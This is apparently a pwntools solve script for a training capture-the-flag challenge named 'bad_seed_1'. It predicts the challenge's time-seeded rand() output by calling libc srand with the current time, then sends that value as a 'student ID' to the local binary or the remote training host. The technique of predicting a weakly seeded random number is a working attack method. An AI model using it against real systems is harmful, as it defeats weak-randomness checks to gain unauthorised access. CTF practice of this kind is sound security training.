from pwn import *
import ctypes
import time

PORT =  1337
HOST = "pwn-bad-seed-1-6027d806d9bc.training.bksec.vn"

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True, sni=HOST)
else:
    p = process('./bad_seed_1')

libc = ctypes.CDLL("libc.so.6")
current_time = int(time.time())
libc.srand(current_time)
result = libc.rand() % 10000 + 20230000

p.sendlineafter(b"Enter your studen ID: ", str(result).encode())

p.interactive()